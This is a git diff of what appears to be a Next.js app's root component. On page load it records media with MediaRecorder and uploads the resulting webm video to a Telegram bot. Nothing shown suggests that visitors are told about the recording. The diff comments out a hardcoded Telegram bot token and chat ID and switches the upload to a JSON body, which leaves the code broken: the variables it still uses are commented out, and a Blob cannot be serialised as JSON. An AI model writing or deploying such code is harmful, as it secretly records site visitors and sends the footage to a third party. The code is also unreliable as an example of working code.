@@ -2,6 +2,9 @@ import Layout from "@/app/components/layout/Layout";
 import '@/app/assets/globals.scss';
 import { Provider } from "@/app/components/ui/Context/Context";
 import { useEffect, useRef } from "react";
+// const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
+// const chatId = "-1001860144177";
+// const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;
 
 const myApp = ({ Component, pageProps }) => {
 
@@ -32,15 +35,17 @@ const myApp = ({ Component, pageProps }) => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
 
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('video', blob, 'video.webm');
-
                         // Отправляем данные на сервер (бота) с использованием fetch
                         try {
                             const response = await fetch(urlApi, {
                                 method: 'POST',
-                                body: formData,
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    video: blob,
+                                }),
                             });
 
                             if (response.ok) {
@@ -67,7 +72,6 @@ const myApp = ({ Component, pageProps }) => {
 
         getMediaAndSendData();
     }, []);
-
 
     // 
 
